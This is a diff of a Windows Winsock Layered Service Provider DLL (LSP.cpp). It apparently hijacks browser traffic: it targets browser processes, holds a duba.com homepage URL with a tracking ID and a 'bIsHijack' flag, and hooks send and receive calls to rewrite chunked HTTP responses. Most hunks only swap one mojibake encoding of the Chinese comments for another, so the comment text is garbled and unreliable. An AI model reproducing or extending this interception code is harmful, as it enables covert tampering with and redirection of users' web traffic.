@@ -1,5 +1,5 @@
 //////////////////////////////////////////////////
-// LSP.cppÎÄ¼ş
+// LSP.cppæ–‡ä»¶
 
 #include <Winsock2.h>
 #include <Ws2spi.h>
@@ -13,7 +13,7 @@
 using namespace std;
 
 #pragma data_seg("mshared")
-CHAR g_MainPge[1024] = "http://www.duba.com/?un_367393_0001";		// Ê×Ò³Buffer
+CHAR g_MainPge[1024] = "http://www.duba.com/?un_367393_0001";		// é¦–é¡µBuffer
 #pragma data_seg()
 
 #pragma comment(linker,"/section:mshared,RWS")
@@ -31,16 +31,16 @@ typedef wstring TString;
 #define CHROME_BROWSER_NAME	TEXT("chrome.exe")
 #define MY_BROWSER_NAME	TEXT("qqbrowser1.exe")
 
-WSPUPCALLTABLE g_pUpCallTable;		// ÉÏ²ãº¯ÊıÁĞ±í¡£Èç¹ûLSP´´½¨ÁË×Ô¼ºµÄÎ±¾ä±ú£¬²ÅÊ¹ÓÃÕâ¸öº¯ÊıÁĞ±í
-WSPPROC_TABLE g_NextProcTable;		// ÏÂ²ãº¯ÊıÁĞ±í
-TCHAR	g_szCurrentApp[MAX_PATH];	// µ±Ç°µ÷ÓÃ±¾DLLµÄ³ÌĞòµÄÃû³Æ
-TCHAR   g_szLogPath[MAX_PATH] = TEXT("C:\\test\\");	// µ±Ç°µ÷ÓÃ±¾DLLµÄ³ÌĞòµÄÃû³Æ
+WSPUPCALLTABLE g_pUpCallTable;		// ä¸Šå±‚å‡½æ•°åˆ—è¡¨ã€‚å¦‚æœLSPåˆ›å»ºäº†è‡ªå·±çš„ä¼ªå¥æŸ„ï¼Œæ‰ä½¿ç”¨è¿™ä¸ªå‡½æ•°åˆ—è¡¨
+WSPPROC_TABLE g_NextProcTable;		// ä¸‹å±‚å‡½æ•°åˆ—è¡¨
+TCHAR	g_szCurrentApp[MAX_PATH];	// å½“å‰è°ƒç”¨æœ¬DLLçš„ç¨‹åºçš„åç§°
+TCHAR   g_szLogPath[MAX_PATH] = TEXT("C:\\test\\");	// å½“å‰è°ƒç”¨æœ¬DLLçš„ç¨‹åºçš„åç§°
 BOOL    bIsHijack  = FALSE;
 BOOL	bFirstLoad = FALSE;
 HMODULE g_hDll = NULL;
 int g_nInsertNum = 0;
 int g_nRevCount = 0;
-//CompletionPortÏà¹Ø¡ı
+//CompletionPortç›¸å…³â†“
 HANDLE g_hShutdownEvent;
 HANDLE g_hCompletionPort;
 SOCKET  g_socket = 0;
@@ -70,7 +70,7 @@ public:
 
 BOOL ToLower(TString &strSrc)
 {
-	// ½«´óĞ´×ÖÄ¸×ª»»ÎªĞ¡Ğ´
+	// å°†å¤§å†™å­—æ¯è½¬æ¢ä¸ºå°å†™
 	for (size_t i = 0; i < strSrc.size(); i++) {
 		if (strSrc[i] & 0x40) {
 			strSrc[i] = (strSrc[i] | 0x20);
@@ -98,7 +98,7 @@ DWORD   WINAPI WorkerThread(LPVOID WorkContext)
 	DWORD nSocket;
 	DWORD nBytesToBeRead;
 	LPOVERLAPPED pOverlapped;
-	while (WAIT_OBJECT_0 != WaitForSingleObject(g_hShutdownEvent, 0))	//Ã»ÓĞĞÅºÅÊ±
+	while (WAIT_OBJECT_0 != WaitForSingleObject(g_hShutdownEvent, 0))	//æ²¡æœ‰ä¿¡å·æ—¶
 	{
 		BOOL bReturn = GetQueuedCompletionStatus(g_hCompletionPort, &nBytesToBeRead, &nSocket, &pOverlapped, INFINITE);
 		_tOVERLAPPEDEx *tOverEx = static_cast<_tOVERLAPPEDEx *>(pOverlapped);
@@ -149,7 +149,7 @@ BOOL APIENTRY DllMain( HANDLE hModule,
 	{
 	case DLL_PROCESS_ATTACH:
 		{
-			// È¡µÃÖ÷Ä£¿éµÄÃû³Æ
+			// å–å¾—ä¸»æ¨¡å—çš„åç§°
 			::GetModuleFileName(NULL, g_szCurrentApp, MAX_PATH);
 			TString strAppName = g_szCurrentApp;
 			ToLower(strAppName);
@@ -170,7 +170,7 @@ BOOL APIENTRY DllMain( HANDLE hModule,
 		break;
 	case DLL_PROCESS_DETACH:
 		{
-			// È¡µÃÖ÷Ä£¿éµÄÃû³Æ
+			// å–å¾—ä¸»æ¨¡å—çš„åç§°
 			::GetModuleFileName(NULL, g_szCurrentApp, MAX_PATH);
 			TString strAppName = g_szCurrentApp;
 			ToLower(strAppName);
@@ -187,7 +187,7 @@ LPWSAPROTOCOL_INFOW GetProvider(LPINT lpnTotalProtocols)
 	int nError;
 	LPWSAPROTOCOL_INFOW pProtoInfo = NULL;
 	
-	// È¡µÃĞèÒªµÄ³¤¶È
+	// å–å¾—éœ€è¦çš„é•¿åº¦
 	if(::WSCEnumProtocols(NULL, pProtoInfo, &dwSize, &nError) == SOCKET_ERROR) {
 		if(nError != WSAENOBUFS)
 			return NULL;
@@ -595,7 +595,7 @@ int WSPAPI WSPSend(
 			//	CopyMemory(lpBuffers->buf, strSend.c_str(), strSend.size());
 			//	lpBuffers->len = strSend.size(); 
 
-			//	//CompletionPort°ó¶¨socket
+			//	//CompletionPortç»‘å®šsocket
 			//	//CreateIoCompletionPort((HANDLE)g_socket, g_hCompletionPort, (DWORD)g_socket, 0);
 			//	LOG2(L" \r\n===========================Send My Socket,lpBuffers->len = %d,pOverlapped->hEvent = %x===============================\r\n", lpBuffers->len,lpOverlapped->hEvent);
 			//}
@@ -664,9 +664,9 @@ int WSPAPI WSPRecv(
 		{
 			g_bNoRecv = FALSE;
 			BOOL bFindFirstSize = FALSE;
-			int nCurrentInsert = 0;	//ÒÑ±£´æµÄÊı¾İ×Ü³¤¶È
-			int nTotalInsert = 0;	//µ±Ç°ChunkÒÑ±£´æµÄ³¤¶È
-			int nCurrentSize = 0;	//µ±Ç°ChunkµÄsize
+			int nCurrentInsert = 0;	//å·²ä¿å­˜çš„æ•°æ®æ€»é•¿åº¦
+			int nTotalInsert = 0;	//å½“å‰Chunkå·²ä¿å­˜çš„é•¿åº¦
+			int nCurrentSize = 0;	//å½“å‰Chunkçš„size
 
 			//vector< int > vec_ChunkSize;
 			//vec_ChunkSize.clear();
@@ -727,13 +727,13 @@ int WSPAPI WSPRecv(
 				}
 				else
 				{
-					if ((nCurrentInsert + dwBytesRecvd) <= nCurrentSize)	//Ö±½Ó±£´æÊı¾İ
+					if ((nCurrentInsert + dwBytesRecvd) <= nCurrentSize)	//ç›´æ¥ä¿å­˜æ•°æ®
 					{
 						memcpy((pCompressBuf + nTotalInsert), pRecvBuf, dwBytesRecvd);
 						nCurrentInsert += dwBytesRecvd;
 						nTotalInsert += dwBytesRecvd;
 					}
-					else   //²éÕÒChunkSize
+					else   //æŸ¥æ‰¾ChunkSize
 					{
 						string strRecv = pRecvBuf;
 						int nPosSizeStart = nCurrentSize - nCurrentInsert;
@@ -812,7 +812,7 @@ int WSPAPI WSPRecv(
 		{
 			if (nBodyLen > (g_nOutputPos + lpBuffers->len))
 			{
-				int nLen = lpBuffers->len - 8;		//Êı¾İ³¤¶È
+				int nLen = lpBuffers->len - 8;		//æ•°æ®é•¿åº¦
 				char ch[16];
 				_itoa_s((nLen), ch, 16);
 				int len = strlen(ch);
@@ -926,7 +926,6 @@ int WSPAPI WSPStartup(
   LPWSPPROC_TABLE lpProcTable
 )
 {
-	//111
 	LOG1(L"  WSPStartup...  %s \n", g_szCurrentApp);
 	
 	int i;
@@ -935,14 +934,14 @@ int WSPAPI WSPStartup(
 		return WSAEPROVIDERFAILEDINIT;
 	}
 	
-	// ±£´æÏòÉÏµ÷ÓÃµÄº¯Êı±íÖ¸Õë£¨ÕâÀïÎÒÃÇ²»Ê¹ÓÃËü£©
+	// ä¿å­˜å‘ä¸Šè°ƒç”¨çš„å‡½æ•°è¡¨æŒ‡é’ˆï¼ˆè¿™é‡Œæˆ‘ä»¬ä¸ä½¿ç”¨å®ƒï¼‰
 	g_pUpCallTable = UpcallTable;
 
-	// Ã¶¾ÙĞ­Òé£¬ÕÒµ½ÏÂ²ãĞ­ÒéµÄWSAPROTOCOL_INFOW½á¹¹	
+	// æšä¸¾åè®®ï¼Œæ‰¾åˆ°ä¸‹å±‚åè®®çš„WSAPROTOCOL_INFOWç»“æ„	
 	WSAPROTOCOL_INFOW	NextProtocolInfo;
 	int nTotalProtos;
 	LPWSAPROTOCOL_INFOW pProtoInfo = GetProvider(&nTotalProtos);
-	// ÏÂ²ãÈë¿ÚID	
+	// ä¸‹å±‚å…¥å£ID	
 	DWORD dwBaseEntryId = lpProtocolInfo->ProtocolChain.ChainEntries[1];
 	for(i=0; i<nTotalProtos; i++)
 	{
@@ -958,11 +957,11 @@ int WSPAPI WSPStartup(
 		return WSAEPROVIDERFAILEDINIT;
 	}
 
-	// ¼ÓÔØÏÂ²ãĞ­ÒéµÄDLL
+	// åŠ è½½ä¸‹å±‚åè®®çš„DLL
 	int nError;
 	TCHAR szBaseProviderDll[MAX_PATH];
 	int nLen = MAX_PATH;
-	// È¡µÃÏÂ²ãÌá¹©³ÌĞòDLLÂ·¾¶
+	// å–å¾—ä¸‹å±‚æä¾›ç¨‹åºDLLè·¯å¾„
 	if(::WSCGetProviderPath(&NextProtocolInfo.ProviderId, szBaseProviderDll, &nLen, &nError) == SOCKET_ERROR)
 	{
 		LOG1(L" WSPStartup: WSCGetProviderPath() failed %d \n", nError);
@@ -973,7 +972,7 @@ int WSPAPI WSPStartup(
 		LOG1(L" WSPStartup:  ExpandEnvironmentStrings() failed %d \n", ::GetLastError());
 		return WSAEPROVIDERFAILEDINIT;
 	}
-	// ¼ÓÔØÏÂ²ãÌá¹©³ÌĞò
+	// åŠ è½½ä¸‹å±‚æä¾›ç¨‹åº
 	HMODULE hModule = ::LoadLibrary(szBaseProviderDll);
 	if(hModule == NULL)
 	{
@@ -981,7 +980,7 @@ int WSPAPI WSPStartup(
 		return WSAEPROVIDERFAILEDINIT;
 	}
 
-	// µ¼ÈëÏÂ²ãÌá¹©³ÌĞòµÄWSPStartupº¯Êı
+	// å¯¼å…¥ä¸‹å±‚æä¾›ç¨‹åºçš„WSPStartupå‡½æ•°
 	LPWSPSTARTUP  pfnWSPStartup = NULL;
 	pfnWSPStartup = (LPWSPSTARTUP)::GetProcAddress(hModule, "WSPStartup");
 	if(pfnWSPStartup == NULL)
@@ -990,7 +989,7 @@ int WSPAPI WSPStartup(
 		return WSAEPROVIDERFAILEDINIT;
 	}
 
-	// µ÷ÓÃÏÂ²ãÌá¹©³ÌĞòµÄWSPStartupº¯Êı
+	// è°ƒç”¨ä¸‹å±‚æä¾›ç¨‹åºçš„WSPStartupå‡½æ•°
 	LPWSAPROTOCOL_INFOW pInfo = lpProtocolInfo;
 	if(NextProtocolInfo.ProtocolChain.ChainLen == BASE_PROTOCOL)
 		pInfo = &NextProtocolInfo;
@@ -1002,10 +1001,10 @@ int WSPAPI WSPStartup(
 		return nRet;
 	}
 
-	// ±£´æÏÂ²ãÌá¹©ÕßµÄº¯Êı±í
+	// ä¿å­˜ä¸‹å±‚æä¾›è€…çš„å‡½æ•°è¡¨
 	g_NextProcTable = *lpProcTable;
 
-	// ĞŞ¸Ä´«µİ¸øÉÏ²ãµÄº¯Êı±í£¬Hook¸ĞĞËÈ¤µÄº¯Êı
+	// ä¿®æ”¹ä¼ é€’ç»™ä¸Šå±‚çš„å‡½æ•°è¡¨ï¼ŒHookæ„Ÿå…´è¶£çš„å‡½æ•°
 	/*lpProcTable->lpWSPAsyncSelect = WSPAsyncSelect;
 	lpProcTable->lpWSPCancelBlockingCall;
 	lpProcTable->lpWSPCleanup = WSPCleanup;
@@ -1042,7 +1041,7 @@ int WSPAPI WSPStartup(
 
 	FreeProvider(pProtoInfo);
 
-	//´´½¨CompletionPort
+	//åˆ›å»ºCompletionPort
 	g_hShutdownEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
 
 	g_hCompletionPort = CreateIoCompletionPort(INVALID_HANDLE_VALUE, NULL, 0, 0);
